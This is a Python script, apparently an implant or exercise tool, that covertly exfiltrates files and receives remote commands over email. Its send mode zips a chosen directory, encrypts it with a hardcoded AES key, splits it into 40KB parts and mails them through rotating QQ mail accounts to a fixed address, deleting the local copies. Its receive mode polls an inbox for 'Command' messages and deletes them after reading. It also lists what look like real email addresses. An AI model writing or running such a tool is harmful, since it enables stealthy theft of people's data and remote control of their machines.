import sys
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import shutil
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from email.mime.text import MIMEText
import imaplib
import email
import time

def encrypt_file(file_name, key):
    cipher = AES.new(key, AES.MODE_CBC)
    with open(file_name, 'rb') as f:
        plaintext = f.read()
    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
    with open(f'{file_name}.enc', 'wb') as f:
        f.write(cipher.iv)
        f.write(ciphertext)
    os.remove(file_name)

def zip_directory(file_path, zip_name):
    shutil.make_archive(zip_name, 'zip', file_path)

def zip_part_compress(zip_name, volume_size):
    with open(f'{zip_name}.zip.enc', 'rb') as f:
        data = f.read()

    total_size = len(data)
    num_volumes = (total_size + volume_size - 1) // volume_size

    for i in range(num_volumes):
        start = i * volume_size
        end = min(start + volume_size, total_size)

        volume_data = data[start:end]
        volume_filename = f"{zip_name}_part{i + 1}.zip"
        with open(volume_filename, 'wb') as vf:
            vf.write(volume_data)

    os.remove(f'{zip_name}.zip.enc')

def send_email_with_attachments(smtp_server, port, sender_email, sender_password, receiver_email, subject, body,
                                attachment_file):
    try:
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver_email
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        with open(attachment_file, "rb") as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(attachment_file)}')
            msg.attach(part)

        with smtplib.SMTP_SSL(smtp_server, port) as server:
            server.login(sender_email, sender_password)
            server.send_message(msg)
        print(f"Part {attachment_file} sent via {sender_email}")
    except Exception as e:
        print(f"Failed to send {attachment_file}: {e}")

def compress_and_send(file_path, email_accounts, receiver_email, subject, body):
    zip_name = os.path.basename(file_path)
    volume_size = 40 * 1024  # 40KB

    zip_directory(file_path, zip_name)
    encrypt_file(f'{zip_name}.zip', b'BUPTBUPTBUPTBUPT')

    zip_part_compress(zip_name, volume_size)

    part_files = [f for f in os.listdir('.') if f.startswith(zip_name) and f.endswith('.zip')]

    for i, file_name in enumerate(part_files):
        account_index = i % len(email_accounts)
        success = False

        while not success and account_index < len(email_accounts):
            email_account = email_accounts[account_index]
            try:
                send_email_with_attachments(
                    email_account['smtp_server'],
                    email_account['port'],
                    email_account['email'],
                    email_account['password'],
                    receiver_email,
                    subject,
                    body,
                    file_name
                )
                success = True
            except Exception:
                account_index += 1

        if not success:
            print(f"All email accounts failed to send {file_name}. Please check your email configurations.")

    for file_name in part_files:
        os.remove(file_name)

def connect_to_email(username, password, imap_server='imap.qq.com'):
    mail = imaplib.IMAP4_SSL(imap_server)
    mail.login(username, password)
    return mail

def receive_command(mail, since_date):
    mail.select('inbox')

    search_criteria = f'(SUBJECT "Command" SINCE "{since_date}")'
    result, data = mail.search(None, search_criteria)
    if result == 'OK':
        for num in data[0].split():
            result, data = mail.fetch(num, '(RFC822)')
            raw_email = data[0][1]
            email_message = email.message_from_bytes(raw_email)
            for part in email_message.walk():
                if part.get_content_type() == "text/plain":
                    command = part.get_payload(decode=True).decode(errors='replace')
                    mail.store(num, '+FLAGS', '\\Deleted')
                    mail.expunge()
                    return command
    return None


if __name__ == '__main__':
    action = sys.argv[1]

    email_accounts = [
        {'smtp_server': 'smtp.qq.com', 'port': 465, 'email': '1722498610@qq.com', 'password': 'xxx'},
        {'smtp_server': 'smtp.qq.com', 'port': 465, 'email': '1445475047@qq.com', 'password': 'xxx'},
        {'smtp_server': 'smtp.qq.com', 'port': 465, 'email': '339054829@qq.com', 'password': 'xxx'},
    ]
    receiver_email = '2524920042@qq.com'
    subject = 'File Part'
    body = 'This is a part of the encrypted file.'

    if action == "receive_cmd":
        username = email_accounts[0]['email']
        password = email_accounts[0]['password']
        mail = connect_to_email(username, password)

        since_date = time.strftime('%d-%b-%Y')

        command = None
        while not command:
            command = receive_command(mail, since_date)
            if command:
                print(command)
            else:
                time.sleep(10)

        mail.logout()

    elif action == "send_file":
        file_path = sys.argv[2]
        compress_and_send(file_path, email_accounts, receiver_email, subject, body)
